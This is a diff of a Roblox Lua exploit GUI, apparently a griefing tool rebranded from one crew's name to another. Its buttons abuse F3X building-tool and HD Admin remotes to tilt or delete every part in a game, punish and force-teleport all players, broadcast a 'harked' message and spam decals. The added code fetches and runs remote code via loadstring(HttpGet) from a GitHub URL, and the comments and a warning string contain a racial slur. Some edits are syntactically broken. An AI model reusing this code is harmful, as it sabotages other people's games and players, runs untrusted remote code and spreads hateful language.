@@ -1,5 +1,5 @@
  --[[
-	HEH NIGGER THIS GUI JST SKIDDED TO K00PGUI H4RKZ IS LAZY TO MAKE HIS GUI
+	HEH NIGGER THIS GUI JST SKIDDED TO K00PGUI , WHITE2SPOOKY IS LAZY TO MAKE HIS GUI
 ]]
 -- Skidded by H4rkz
 -- @thechoosenone4kz
@@ -65,7 +65,7 @@ local shut_3 = Instance.new("TextButton")
 
 --Properties:
 local hakz = Instance.new("ScreenGui")
-hakz.Name = "hakz"
+hakz.Name = "White2SpookyI0"
 hakz.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 hakz.ResetOnSpawn = false
 
@@ -101,7 +101,7 @@ TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
 TextLabel.Position = UDim2.new(0.272000015, 0, 0.0189999994, 0)
 TextLabel.Size = UDim2.new(0, 170, 0, 32)
 TextLabel.Font = Enum.Font.Arial
-TextLabel.Text = "H4rkz Gui F3x Skidded to K00pgui"
+TextLabel.Text = "White2spooky Gui F3x Skidded to K00pgui"
 TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.TextScaled = true
 TextLabel.TextSize = 14.000
@@ -140,7 +140,7 @@ TextLabel_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
 TextLabel_4.Position = UDim2.new(0.442408621, 0, 21.7270947, 0)
 TextLabel_4.Size = UDim2.new(0, 170, 0, 14)
 TextLabel_4.Font = Enum.Font.Arial
-TextLabel_4.Text = "by thechoosenone4kz [team H4rkz]"
+TextLabel_4.Text = "by thechoosenone4kz [team white2spooky]"
 TextLabel_4.TextColor3 = Color3.fromRGB(24, 24, 24)
 TextLabel_4.TextScaled = true
 TextLabel_4.TextSize = 14.000
@@ -451,277 +451,73 @@ ShakeBaseplate.TextScaled = true
 ShakeBaseplate.TextSize = 14.000
 ShakeBaseplate.TextWrapped = true
 ShakeBaseplate.MouseButton1Click:Connect(function()
-	local player = game.Players.LocalPlayer
-	local char = player.Character
-	local tool
-	for i,v in player:GetDescendants() do
-		if v.Name == "SyncAPI" then
-			tool = v.Parent
-		end
-	end
-	for i,v in game.ReplicatedStorage:GetDescendants() do
-		if v.Name == "SyncAPI" then
-			tool = v.Parent
-		end
-	end
-	remote = tool.SyncAPI.ServerEndpoint
-	function _(args)
-		remote:InvokeServer(unpack(args))
-	end
-	function SetCollision(part,boolean)
-		local args = {
-			[1] = "SyncCollision",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["CanCollide"] = boolean
-				}
-			}
-		}
-		_(args)
-	end
-	function SetAnchor(boolean,part)
-		local args = {
-			[1] = "SyncAnchor",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Anchored"] = boolean
-				}
-			}
-		}
-		_(args)
-	end
-	function CreatePart(cf,parent)
-		local args = {
-			[1] = "CreatePart",
-			[2] = "Normal",
-			[3] = cf,
-			[4] = parent
-		}
-		_(args)
-	end
-	function DestroyPart(part)
-		local args = {
-			[1] = "Remove",
-			[2] = {
-				[1] = part
-			}
-		}
-		_(args)
-	end
-	function MovePart(part,cf)
-		local args = {
-			[1] = "SyncMove",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["CFrame"] = cf
-				}
-			}
-		}
-		_(args)
-	end
-	function Resize(part,size,cf)
-		local args = {
-			[1] = "SyncResize",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["CFrame"] = cf,
-					["Size"] = size
-				}
-			}
-		}
-		_(args)
-	end
-	function AddMesh(part)
-		local args = {
-			[1] = "CreateMeshes",
-			[2] = {
-				[1] = {
-					["Part"] = part
-				}
-			}
-		}
-		_(args)
-	end
+local player = game.Players.LocalPlayer
 
-	function SetMesh(part,meshid)
-		local args = {
-			[1] = "SyncMesh",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["MeshId"] = "rbxassetid://"..meshid
-				}
-			}
-		}
-		_(args)
-	end
-	function SetTexture(part, texid)
-		local args = {
-			[1] = "SyncMesh",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["TextureId"] = "rbxassetid://"..texid
-				}
-			}
-		}
-		_(args)
-	end
-	function SetName(part, stringg)
-		local args = {
-			[1] = "SetName",
-			[2] = {
-				[1] = part
-			},
-			[3] = stringg
-		}
+local tool
 
-		_(args)
-	end
-	function MeshResize(part,size)
-		local args = {
-			[1] = "SyncMesh",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Scale"] = size
-				}
-			}
-		}
-		_(args)
-	end
-	function Weld(part1, part2,lead)
-		local args = {
-			[1] = "CreateWelds",
-			[2] = {
-				[1] = part1,
-				[2] = part2
-			},
-			[3] = lead
-		}
-		_(args)
+for _,v in pairs(player:GetDescendants()) do
+
+	if v.Name == "SyncAPI" then		tool = v.Parent
 
 	end
-	function SetLocked(part,boolean)
-		local args = {
-			[1] = "SetLocked",
-			[2] = {
-				[1] = part
-			},
-			[3] = boolean
-		}
-		_(args)
+
+end
+
+for _,v in pairs(game.ReplicatedStorage:GetDescendants()) do
+
+	if v.Name == "SyncAPI" then
+
+		tool = v.Parent
+
 	end
-	function SetTrans(part,int)
-		local args = {
-			[1] = "SyncMaterial",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Transparency"] = int
-				}
+
+end
+
+if not tool then return end
+
+local remote = tool.SyncAPI.ServerEndpoint
+
+local function MovePart(part,cf)
+
+	remote:InvokeServer(
+
+		"SyncMove",
+
+		{
+
+			{
+
+				Part = part,
+
+				CFrame = cf
+
 			}
-		}
-		_(args)
-	end
-	function CreateSpotlight(part)
-		local args = {
-			[1] = "CreateLights",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["LightType"] = "SpotLight"
-				}
-			}
-		}
-		_(args)
-	end
-	function SyncLighting(part,brightness)
-		local args = {
-			[1] = "SyncLighting",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["LightType"] = "SpotLight",
-					["Brightness"] = brightness
-				}
-			}
-		}
-		_(args)
-	end
-	function Color(part,color)
-		local args = {
-			[1] = "SyncColor",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Color"] = color --[[Color3]],
-					["UnionColoring"] = false
-				}
-			}
-		}
-		_(args)
-	end
-	function SpawnDecal(part,side)
-		local args = {
-			[1] = "CreateTextures",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Face"] = side,
-					["TextureType"] = "Decal"
-				}
-			}
+
 		}
 
-		_(args)
+	)
+
+end
+
+for _,part in ipairs(workspace:GetDescendants()) do
+
+	if part:IsA("BasePart") then
+
+		spawn(function()
+
+			local cf = part.CFrame * CFrame.Angles(0,0,math.rad(30))
+
+			pcall(function()
+
+				MovePart(part,cf)
+
+			end)
+
+		end)
+
 	end
-	function AddDecal(part,asset,side)
-		local args = {
-			[1] = "SyncTexture",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Face"] = side,
-					["TextureType"] = "Decal",
-					["Texture"] = "rbxassetid://".. asset
-				}
-			}
-		}
-		_(args)
-	end
 
-	function spam(id)
-		for i,v in game.workspace:GetDescendants() do
-			if v:IsA("BasePart") then
-				spawn(function()
-					SetLocked(v,false)
-					SpawnDecal(v,Enum.NormalId.Front)
-					AddDecal(v,id,Enum.NormalId.Front)
-
-					SpawnDecal(v,Enum.NormalId.Back)
-					AddDecal(v,id,Enum.NormalId.Back)
-
-					SpawnDecal(v,Enum.NormalId.Right)
-					AddDecal(v,id,Enum.NormalId.Right)
-
-					SpawnDecal(v,Enum.NormalId.Left)
-					AddDecal(v,id,Enum.NormalId.Left)
-
-					SpawnDecal(v,Enum.NormalId.Bottom)
-					AddDecal(v,id,Enum.NormalId.Bottom)
-
-					SpawnDecal(v,Enum.NormalId.Top)
-					AddDecal(v,id,Enum.NormalId.Top)
-				end)
-			end
-		end 
-	end
-	spam("106517933385903")
+end
 end)
 
 ImageLabel_2.Parent = TextLabel_4
@@ -731,7 +527,7 @@ ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
 ImageLabel_2.BorderSizePixel = 0
 ImageLabel_2.Position = UDim2.new(0.388235301, 0, 25.1428566, 0)
 ImageLabel_2.Size = UDim2.new(0, 100, 0, 100)
-ImageLabel_2.Image = "http://www.roblox.com/asset/?id=105378595017204"
+ImageLabel_2.Image = "http://www.roblox.com/asset/?id=120833786279619"
 
 shut.Name = "shut"
 shut.Parent = TextLabel_4
@@ -1108,12 +904,12 @@ decal.MouseButton1Click:Connect(function()
 			end
 		end 
 	end
-	spam("9422866248")
+	spam("103090501277573")
 end)
 
 gametp.Name = "gametp"
 gametp.Parent = TextLabel_4
-gametp.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+gametp.backgroundColor3 = Color3.fromRGB(0, 0, 0)
 gametp.BorderColor3 = Color3.fromRGB(0, 53, 11)
 gametp.Position = UDim2.new(-0.0117647061, -39, -16.0714283, 0)
 gametp.Size = UDim2.new(0, 204, 0, 39)
@@ -1127,7 +923,7 @@ gametp.MouseButton1Click:Connect(function()
 	local ReplicatedStorage = game:GetService("ReplicatedStorage")
 	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
 
-	RequestCommand:InvokeServer(";globalforceplace 16346930062")
+	RequestCommand:InvokeServer(";globalforceplace 111105964184410 ;place all 111105964184410")
 end)
 
 disco.Name = "disco"
@@ -1493,7 +1289,7 @@ message.MouseButton1Click:Connect(function()
 	local ReplicatedStorage = game:GetService("ReplicatedStorage")
 	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
 
-	RequestCommand:InvokeServer(";serverMessage Team k00pkidd has haxed this game!!!")
+	RequestCommand:InvokeServer(";serverMessage Team White2spooky has harked this game!!!")
 end)
 
 stop.Name = "stop"
@@ -1512,7 +1308,7 @@ stop.MouseButton1Click:Connect(function()
 	local ReplicatedStorage = game:GetService("ReplicatedStorage")
 	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
 
-	RequestCommand:InvokeServer(";Music")
+	RequestCommand:InvokeServer(";unmusic")
 end)
 
 k00pk00p.Name = "k00pk00p"
@@ -1864,349 +1660,56 @@ Destroy.TextScaled = true
 Destroy.TextSize = 14.000
 Destroy.TextWrapped = true
 Destroy.MouseButton1Click:Connect(function()
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
-	RequestCommand:InvokeServer(";btools me")
-	wait(0.4)
-	RequestCommand:InvokeServer(";punish all")
-	wait(0.1)
-	local player = game.Players.LocalPlayer
-	local char = player.Character
-	local backpack = player.Backpack
-
-	local function getf3x()
-		for _, v in ipairs(backpack:GetChildren()) do
-			if v:FindFirstChild("SyncAPI") then
-				return v
-			end
-		end
-		for _, v in ipairs(char:GetChildren()) do
-			if v:FindFirstChild("SyncAPI") then
-				return v
-			end
-		end
-
-		return nil
-	end
-	local f3x = getf3x()
-	if not f3x then
-		warn("you dont have f3x skid")
-	end
-	local syncapi = f3x.SyncAPI
-	local serverendpoint = syncapi.ServerEndpoint
-
-	local function delete(part)
-		local args = {
-			[1] = "Remove",
-			[2] = {
-				[1] = part
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function deleteall()
-		for _, v in ipairs(workspace:GetDescendants()) do
-			if v:IsA("BasePart") or v:IsA("UnionOperation") then
-				spawn(function()
-					delete(v)
-				end)
-			end
-		end
-	end
-
-	deleteall()
-
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
-	RequestCommand:InvokeServer(";fogcolor black ;time")
-	local player = game.Players.LocalPlayer
-	local char = player.Character
-	local backpack = player.Backpack
-
-	local function getf3x()
-		for _, v in ipairs(backpack:GetChildren()) do
-			if v:FindFirstChild("SyncAPI") then
-				return v
-			end
-		end
-		for _, v in ipairs(char:GetChildren()) do
-			if v:FindFirstChild("SyncAPI") then
-				return v
-			end
-		end
-
-		return nil
-	end
-	local f3x = getf3x()
-	if not f3x then
-		warn("you dont have f3x skid")
-	end
-	local syncapi = f3x.SyncAPI
-	local serverendpoint = syncapi.ServerEndpoint
-
-	local function resize(part,size,cf)
-		local args = {
-			[1] = "SyncResize",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["CFrame"] = cf,
-					["Size"] = size
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function syncmaterial(part,mate,trans)
-		local args = {
-			[1] = "SyncMaterial",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Material"] = mate
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-	local function transparency(part,trans)
-		local args = {
-			[1] = "SyncMaterial",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Transparency"] = trans
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function color(part, color)
-		local args = {
-			[1] = "SyncColor",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Color"] = color --[[Color3]],
-					["UnionColoring"] = false
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function syncmeshid(part, id)
-		local args = {
-			[1] = "SyncMesh",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["MeshId"] = "rbxassetid://"..id
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function makemesh(part)
-		local args = {
-			[1] = "CreateMeshes",
-			[2] = {
-				[1] = {
-					["Part"] = part
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function syncmeshsize(part, vectora)
-		local args = {
-			[1] = "SyncMesh",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Scale"] = vectora
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function syncmeshtexture(part, id)
-		local args = {
-			[1] = "SyncMesh",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["TextureId"] =	"rbxassetid://"..id
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function name(part, stringa)
-		local args = {
-			[1] = "SetName",
-			[2] = {
-				[1] = part
-			},
-			[3] = stringa
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function lock(part, boolean)
-		local args = {
-			[1] = "SetLocked",
-			[2] = {
-				[1] = part
-			},
-			[3] = boolean
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function setcollision(part, booleana)
-		local args = {
-			[1] = "SyncCollision",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["CanCollide"] = booleana
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function setanchor(part, boolean)
-		local args = {
-			[1] = "SyncAnchor",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Anchored"] = boolean
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function createdecal(part, side)
-		local args = {
-			[1] = "CreateTextures",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Face"] = side,
-					["TextureType"] = "Decal"
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-	local function setdecal(part, asset, side)
-		local args = {
-			[1] = "SyncTexture",
-			[2] = {
-				[1] = {
-					["Part"] = part,
-					["Face"] = side,
-					["TextureType"] = "Decal",
-					["Texture"] = "rbxassetid://".. asset
-				}
-			}
-		}
-		serverendpoint:InvokeServer(unpack(args))
-	end
-
-	local function makerealmbase()
-		local position = CFrame.new(0, 5, 0)
-		local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
-		resize(base, Vector3.new(512, 16, 512), position)
-		syncmaterial(base, Enum.Material.Concrete)
-		color(base, Color3.new(0.513725, 0.513725, 0.513725))
-		name(base, "loltroll")
-		lock(base, true)
-
-		local spawnpos = CFrame.new(34.5, 8.1, -26)
-		local spawna = serverendpoint:InvokeServer("CreatePart", "Spawn", spawnpos, workspace)
-		resize(spawna, Vector3.new(20, 10, 20), spawnpos)
-		name(spawna, "SpawnLocation")
-		lock(spawna, true)
-
-		createdecal(spawna, Enum.NormalId.Top)
-		setdecal(spawna, "12165709661", Enum.NormalId.Top)
-		transparency(spawna, 1)
-
-		local pos = CFrame.new(74.143, 24, -25.232)
-
-		local rules = serverendpoint:InvokeServer("CreatePart", "Normal", pos, workspace)
-
-		transparency(rules, 0)
-		setcollision(rules, false)
-		createdecal(rules, Enum.NormalId.Left)
-		setdecal(rules, "103516240291943", Enum.NormalId.Left)
-		color(rules, Color3.new(1, 1, 1))
-		resize(rules, Vector3.new(4, 23, 37), pos)
-
-
-		local pos = CFrame.new(1.143, 24, -25.232)
-
-		local bad = serverendpoint:InvokeServer("CreatePart", "Normal", pos, workspace)
-
-		transparency(bad, 1)
-		setcollision(bad, false)
-		createdecal(bad, Enum.NormalId.Right)
-		setdecal(bad, "12165709661", Enum.NormalId.Right)
-		resize(bad, Vector3.new(4, 23, 37), pos)
-
-	end
-
-	local function sky()
-		local position = CFrame.new(0, 5, 0)
-		local sky = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
-
-		makemesh(sky)
-		syncmeshid(sky, "111891702759441")
-		syncmeshtexture(sky, "9820931824")
-		syncmeshsize(sky, Vector3.new(20000, 20000, 20000))
-		lock(sky, true)
-		name(sky, "kn000pezzzzz")
-		setcollision(sky, false)
-	end
-
-
-
-
-	local function unanchorall()
-		for _, v in ipairs(workspace:GetDescendants()) do
-			if v:IsA("BasePart") or v:IsA("UnionOperation") then
-				spawn(function()
-					setanchor(v, false)
-				end)
-			end
-		end
-	end
-
-	local function realm()
-		sky()
-		makerealmbase()
-	end
-
-	realm()
-
-	RequestCommand:InvokeServer(";res all")
-	wait(0.3)
-	RequestCommand:InvokeServer(";r6 all")
-	RequestCommand:InvokeServer(";time 12")
-	wait(8.9)
-	RequestCommand:InvokeServer(";music 1839246711 ;volume inf ;pitch 1.04")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage
+:WaitForChild("HDAdminHDClient")
+.Signals.RequestCommandSilent
+ 
+RequestCommand:InvokeServer(";btools me")
+RequestCommand:InvokeServer(";time 0 ;undisco ;unmusic ;unfogcolor")
+task.wait(0.3)
+RequestCommand:InvokeServer(";punish all ")
+ 
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local backpack = player:WaitForChild("Backpack")
+ 
+local function getf3x()
+for _,v in ipairs(backpack:GetChildren()) do
+if v:FindFirstChild("SyncAPI") then return v end
+end
+for _,v in ipairs(char:GetChildren()) do
+if v:FindFirstChild("SyncAPI") then return v end
+end
+end
+ 
+local f3x = getf3x()
+if not f3x then warn("stupid nigger no f3x!") return end
+local serverendpoint = f3x.SyncAPI.ServerEndpoint
+ 
+local function remove(p)
+serverendpoint:InvokeServer("Remove",{p})
+end
+ 
+local function deleteall()
+for _,v in ipairs(workspace:GetDescendants()) do
+if v:IsA("BasePart") or v:IsA("UnionOperation") then
+task.spawn(function()
+pcall(function() remove(v) end)
+end)
+end
+end
+end
+--
+deleteall()
+task.wait(0.6)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zaxh69/Project/refs/heads/main/Musque-realm-but-better"))()
+RequestCommand:InvokeServer(";res all")
+task.wait(0.3)
+RequestCommand:InvokeServer(";time 0")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+RequestCommand:InvokeServer(";music 119124023763505 ;volume 2 ")
 end)
 
 hint.Name = "hint"
@@ -3394,12 +2897,13 @@ dreemy.MouseButton1Click:Connect(function()
 				SetMesh(v,"111891702759441")
 				SetTexture(v,id)
 				--end)
-				MeshResize(v,Vector3.new(7000, 7000, 7000))
+				MeshResize(v,Vector3.new(5000, 5000, 5000))
 				SetLocked(v,true)
+                Vector3.new(3,3,3)
 			end
 		end
 	end
-	Sky("201208408")
+	Sky("120833786279619")
 end)
 
 shamsterky.Name = "shamsterky"
